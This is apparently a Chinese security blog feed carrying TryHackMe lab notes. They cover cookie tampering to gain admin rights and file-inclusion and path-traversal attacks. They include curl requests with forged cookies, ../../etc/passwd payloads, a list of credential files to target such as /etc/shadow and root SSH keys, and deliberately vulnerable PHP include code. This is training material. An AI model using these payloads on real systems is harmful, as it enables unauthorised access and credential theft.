&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;cookie-篡改&#34;&gt;Cookie 篡改
&lt;/h2&gt;&lt;p&gt;在联机会话期间检查和编辑 Web 服务器设置的 Cookie 可能会产生多种结果，例如未经身份验证的访问、访问其他用户帐户或提升的权限。&lt;/p&gt;
&lt;h3 id=&#34;纯文本&#34;&gt;&lt;strong&gt;纯文本&lt;/strong&gt;
&lt;/h3&gt;&lt;p&gt;某些 cookie 的内容可以是纯文本形式，并且它们的作用很明显。例如，如果这些是成功登录后设置的 Cookie：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Set-Cookie: logged_in=true; Max-Age=3600; Path=/
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Set-Cookie: admin=false; Max-Age=3600; Path=/
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;我们看到一个 Cookie （logged_in），它似乎用于控制用户当前是否登录，以及另一个 （admin），它控制访客是否具有管理员权限。使用这个逻辑，如果我们要更改 cookie 的内容并发出请求，我们将能够更改我们的权限。&lt;/p&gt;
&lt;p&gt;首先，我们先请求目标页面：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;user@tryhackme$ curl http://MACHINE_IP/cookie-test
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;我们可以看到我们返回了一条消息：&lt;strong&gt;Not Logged In&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;现在，我们将发送另一个请求，其中 logged_in Cookie 设置为 true，管理 Cookie 设置为 false：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;user@tryhackme$ curl -H &amp;#34;Cookie: logged_in=true; admin=false&amp;#34; http://MACHINE_IP/cookie-test
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;我们收到消息：&lt;strong&gt;Logged In As A User&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;最后，我们将发送最后一个请求，将 logged_in 和 admin Cookie 都设置为 true：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;user@tryhackme$ curl -H &amp;#34;Cookie: logged_in=true; admin=true&amp;#34; http://MACHINE_IP/cookie-test
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;这将返回结果：&lt;strong&gt;Logged In As An Admin&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;hashing-散列法&#34;&gt;Hashing &lt;strong&gt;散列法&lt;/strong&gt;
&lt;/h3&gt;&lt;p&gt;有时 Cookie 值看起来像一长串随机字符;这些称为哈希，它是原始文本的不可逆表示。以下是您可能会遇到的一些示例：&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;&lt;strong&gt;原始字符串&lt;/strong&gt;&lt;/th&gt;
          &lt;th&gt;** 哈希方法**&lt;/th&gt;
          &lt;th&gt;&lt;strong&gt;输出&lt;/strong&gt;&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;1&lt;/td&gt;
          &lt;td&gt;md5&lt;/td&gt;
          &lt;td&gt;c4ca4238a0b923820dcc509a6f75849b&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;1&lt;/td&gt;
          &lt;td&gt;sha-256&lt;/td&gt;
          &lt;td&gt;6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;1&lt;/td&gt;
          &lt;td&gt;sha-512&lt;/td&gt;
          &lt;td&gt;4dff4ea340f0a823f15d3f4f01ab62eae0e5da579ccb851f8db9dfe84c58b2b37b89903a740e1ee172da793a6e79d560e5f7f9bd058a12a280433ed6fa46510a&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;1&lt;/td&gt;
          &lt;td&gt;sha1&lt;/td&gt;
          &lt;td&gt;356a192b7913b04c54574d18c28d46e6395428ab&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;从上表中可以看出，同一输入字符串的哈希输出可能会因使用的哈希方法而显著不同。即使哈希是不可逆的，但每次都会产生相同的输出，这对我们很有帮助，因为 &lt;a class=&#34;link&#34; href=&#34;https://crackstation.net/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://crackstation.net/&lt;/a&gt; 等服务会保留数十亿个哈希及其原始字符串的数据库。&lt;/p&gt;
&lt;h3 id=&#34;编码&#34;&gt;&lt;strong&gt;编码&lt;/strong&gt;
&lt;/h3&gt;&lt;p&gt;编码类似于哈希，因为它会创建看似随机的文本字符串，但实际上，编码是可逆的。所以这就引出了一个问题，编码的意义何在？编码使我们能够将二进制数据转换为人类可读的文本，这些文本可以通过仅支持纯文本 ASCII 字符的介质轻松安全地传输。&lt;/p&gt;
&lt;p&gt;常见的编码类型包括 base32 和 base64，前者将二进制数据转换为字符 A-Z 和 2-7，后者使用字符 a-z、A-Z、0-9、+ 和 equals 符号进行转换进行填充。&lt;/p&gt;
&lt;p&gt;以以下数据为例，该数据由 Web 服务器在登录时设置：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Set-Cookie: session=eyJpZCI6MSwiYWRtaW4iOmZhbHNlfQ==; Max-Age=3600; Path=/
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;这个字符串 base64 解码的值为 &lt;strong&gt;{“id”：1，“admin”： false}&lt;/strong&gt; ，然后我们可以再次将其编码回 base64 编码，但将 admin 值设置为 true，这现在为我们提供了管理员访问权限。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>文件包含基础</title>
        <link>https://Yerucrem.github.io/p/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%9F%BA%E7%A1%80/</link>
        <pubDate>Wed, 19 Mar 2025 00:00:00 +0000</pubDate>
        
        <guid>https://Yerucrem.github.io/p/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%9F%BA%E7%A1%80/</guid>
        <description>&lt;img src="https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/638445f84229dc4814eb81dfe06baeb837e3a5e8920ec39035d8dd6e02c0a10d.png" alt="Featured image of post 文件包含基础" /&gt;&lt;h1 id=&#34;文件包含基础&#34;&gt;文件包含基础
&lt;/h1&gt;&lt;h2 id=&#34;介绍&#34;&gt;介绍
&lt;/h2&gt;&lt;p&gt;此房间旨在为您提供利用文件包含漏洞的基本知识，包括本地文件包含 （LFI）、远程文件包含 （RFI） 和目录遍历。此外，我们还将讨论发现这些漏洞的风险以及所需的补救措施。我们提供了每个漏洞的一些实际示例以及实践挑战。&lt;/p&gt;
&lt;p&gt;在某些情况下，编写 Web 应用程序是为了通过参数请求访问给定系统上的文件，包括图像、静态文本等。参数是附加到 URL 的查询参数字符串，可用于检索数据或根据用户输入执行作。 下图分解了 URL 的基本部分。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250319135235271.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;例如，参数用于 Google 搜索，其中 GET 请求将用户输入传递到搜索引擎中。 &lt;a class=&#34;link&#34; href=&#34;https://www.google.com/search?q=TryHackMe&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://www.google.com/search?q=TryHackMe&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;让我们讨论一个用户请求从 Web 服务器访问文件的场景。首先，用户向 Web 服务器发送一个 HTTP 请求，其中包含要显示的文件。例如，如果用户想要在 Web 应用程序中访问和显示其 CV，则请求可能如下所示，http://webapp.thm/get.php?file=userCV.pdf，其中 file 是参数，userCV.pdf是要访问的必需文件。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250319135313594.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;为什么会出现文件包含漏洞&#34;&gt;为什么会出现文件包含漏洞？
&lt;/h3&gt;&lt;p&gt;文件包含漏洞通常在 Web 应用程序（如 PHP ）的各种编程语言 中发现和利用，这些应用程序编写和实现都很糟糕。这些漏洞的主要问题是输入验证，其中用户输入没有经过清理或验证，由用户控制它们。当输入未经过验证时，用户可以将任何输入传递给函数，从而导致漏洞。&lt;/p&gt;
&lt;h3 id=&#34;文件包含有什么风险&#34;&gt;文件包含有什么风险？
&lt;/h3&gt;&lt;p&gt;默认情况下，攻击者可以利用文件包含漏洞来泄露数据，例如代码、凭据或与 Web 应用程序或作系统相关的其他重要文件。此外，如果攻击者可以通过任何其他方式将文件写入服务器，则文件包含可能会协同使用以获得远程命令执行 （RCE）。&lt;/p&gt;
&lt;h2 id=&#34;路径遍历&#34;&gt;路径遍历
&lt;/h2&gt;&lt;p&gt;也称为目录遍历，允许攻击者读取作系统资源，例如运行应用程序的服务器上的本地文件。攻击者通过纵和滥用 Web 应用程序的 URL 来查找和访问存储在应用程序根目录之外的文件或目录，从而利用此漏洞。&lt;/p&gt;
&lt;p&gt;当用户的输入传递到 PHP 中的 file_get_contents 等函数时，会出现路径遍历漏洞。请务必注意，该函数并不是导致此漏洞的主要因素。通常，糟糕的输入验证或筛选是导致此漏洞的原因。在 PHP 中，您可以使用 file_get_contents 读取文件的内容。&lt;/p&gt;
&lt;p&gt;下图显示了 Web 应用程序如何在 &lt;code&gt;/var/www/app&lt;/code&gt; 中存储文件。满意的路径是用户请求 从定义的路径 &lt;code&gt;/var/www/app/CVs userCV.pdf&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250319135502038.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;我们 可以通过添加有效负载来测试 URL 参数，以查看 Web 应用程序的行为方式。路径遍历攻击，也称为点-点-斜杠攻击，利用双点将目录上移一步。 如果攻击者找到入口点，在本例中为 get.php?file=，那么攻击者可能会发送如下内容 &lt;a class=&#34;link&#34; href=&#34;http://webapp.thm/get.php?file=../../../../etc/passwd&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://webapp.thm/get.php?file=../../../../etc/passwd&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;假设没有输入验证，而不是访问 PDF 文件位于 /var/www/app/CVs 位置，则 Web 应用程序会从其他 目录，在本例中为 /etc/passwd。每个 &lt;code&gt;..&lt;/code&gt; 条目都会移动一个目录，直到到达根目录 &lt;code&gt;/&lt;/code&gt;。然后，它将目录更改为 /etc，然后从那里读取 passwd 文件。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250319135730518.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;因此，Web 应用程序将文件的内容发送回给用户。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250319135753945.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;同样，如果 Web 应用程序在 Windows 服务器上运行，攻击者需要提供 Windows 路径。例如，如果攻击者想要读取位于c:\boot.ini 中的 boot.ini 文件，则攻击者可以根据目标尝试以下作 作系统版本：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;http://webapp.thm/get.php?file=../../../../boot.ini 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;或
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;http://webapp.thm/get.php?file=../../../../windows/win.ini
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;与 Linux作系统相同的概念在这里适用，在这种作系统中，我们爬上目录直到它到达根目录，这通常是 .&lt;/p&gt;
&lt;p&gt;有时，开发人员会添加过滤器以限制仅访问某些文件或目录。以下是测试时可以使用的一些常见作系统文件。&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;位置&lt;/th&gt;
          &lt;th&gt;描述&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;/etc/issue&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;包含要在登录提示之前打印的消息或系统标识。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;/etc/profile&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;控制系统范围的默认变量，如导出变量、文件创建掩码 （umask）、终端类型、邮件消息，以指示新邮件何时到达&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;/proc/version&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;指定 Linux 内核的版本&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;etc/passwd&lt;/code&gt; &lt;code&gt;等/passwd&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;具有有权访问系统的所有注册用户&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;/etc/shadow&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;包含有关系统用户密码的信息&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;/root/.bash_history&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;包含 &lt;code&gt;root &lt;/code&gt;用户的 history 命令&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;/var/log/dmessage&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;包含全局系统消息，包括系统启动期间记录的消息&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;`/var/mail/root&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;根&lt;/code&gt;用户的所有电子邮件&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;/root/.ssh/id_rsa&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;服务器上 root 或任何已知有效用户的私有 SSH 密钥&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;/var/log/apache2/access.log&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;Web 服务器的&lt;/code&gt;访问请求&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;C:\boot.ini&lt;/code&gt; &lt;code&gt;C：\boot.ini&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;包含具有 BIOS 固件的计算机的启动选项&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;本地文件包含-lfi&#34;&gt;本地文件包含 LFI
&lt;/h2&gt;&lt;h3 id=&#34;一&#34;&gt;一
&lt;/h3&gt;&lt;p&gt;针对 Web 应用程序的 LFI 攻击通常是由于开发人员缺乏安全意识。使用 PHP 时，使用 include、require、include_once 和 require_once 等功能通常会导致 Web 应用程序易受攻击。在这个房间里，我们将挑选 PHP，但值得注意的是，使用其他语言（如 ASP、JSP）甚至在 Node.js 应用程序中也会出现 LFI 漏洞。LFI 漏洞利用遵循与路径遍历相同的概念。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;PHP&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;k&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;lang&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;上面的 PHP 代码通过 URL 参数 lang 使用 GET 请求来包含页面的文件。可以通过发送以下 HTTP 请求来完成调用，如下所示：http://webapp.thm/index.php?lang=EN.php 加载英文页面或 &lt;a class=&#34;link&#34; href=&#34;http://webapp.thm/index.php?lang=AR.php&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://webapp.thm/index.php?lang=AR.php&lt;/a&gt;加载阿拉伯语页面，其中 EN.php 和 AR.php文件位于同一目录中。&lt;/p&gt;
&lt;p&gt;理论上，如果没有任何输入验证，我们可以从上面的代码中访问和显示服务器上的任何可读文件。假设我们想读取 /etc/passwd 文件，其中包含有关 Linux作系统用户的敏感信息，我们可以尝试以下作：http://webapp.thm/get.php?file=/etc/passwd&lt;/p&gt;
&lt;p&gt;在这种情况下，它之所以有效，是因为 include 函数中没有指定目录，也没有输入验证。&lt;/p&gt;
&lt;h3 id=&#34;二&#34;&gt;二
&lt;/h3&gt;&lt;p&gt;接下来，在下面的代码中，开发人员决定指定函数内部的目录。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;PHP&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;k&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;languages/&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;lang&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;在上面的代码中，开发者决定使用 include 函数，只通过 lang 参数调用 languages 目录下的 PHP 页面。&lt;/p&gt;
&lt;p&gt;如果没有输入验证，攻击者可以通过将 lang 输入替换为其他作系统敏感文件（如 /etc/passwd）来纵 URL。&lt;/p&gt;
&lt;p&gt;同样，有效负载看起来类似于路径遍历，但 include 函数允许我们将任何调用的文件包含到当前页面中。以下是漏洞利用：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;http://webapp.thm/index.php?lang=../../../../etc/passwd
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;本地文件包含-lfi2&#34;&gt;本地文件包含 LFI2
&lt;/h2&gt;&lt;p&gt;在这项任务中，我们将更深入地了解 LFI。我们讨论了在 include 函数中绕过过滤器的几种技术。&lt;/p&gt;
&lt;p&gt;在前两种情况下，我们检查了 Web 应用程序的代码，然后我们知道如何利用它。但是，在本例中，我们正在执行黑盒测试，其中我们没有源代码。在这种情况下，错误对于了解数据如何传递和处理到 Web 应用程序中非常重要。&lt;/p&gt;
&lt;p&gt;在此方案中，我们有以下入口点： &lt;code&gt;http://webapp.thm/index.php?lang=EN&lt;/code&gt; 。如果我们输入无效的输入（例如 THM），则会收到以下错误&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Warning&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;languages&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;THM&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;php&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;failed&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;to&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;open&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;stream&lt;/span&gt;&lt;span 